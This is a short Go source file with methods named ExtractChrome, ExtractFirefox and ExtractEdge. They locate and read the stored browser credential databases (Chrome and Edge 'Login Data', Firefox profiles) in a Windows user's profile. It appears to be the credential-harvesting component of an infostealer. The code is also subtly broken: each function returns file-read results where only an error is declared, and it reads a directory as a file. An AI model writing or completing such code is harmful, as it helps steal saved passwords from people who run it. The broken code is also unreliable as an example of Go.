package windows

import (
"os"
"path/filepath"
)

type Browser struct{}

func NewBrowser() *Browser {
return &Browser{}
}

func (b *Browser) ExtractChrome() error {
path := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
return os.ReadFile(path)
}

func (b *Browser) ExtractFirefox() error {
path := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
return os.ReadFile(path)
}

func (b *Browser) ExtractEdge() error {
path := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
return os.ReadFile(path)
}
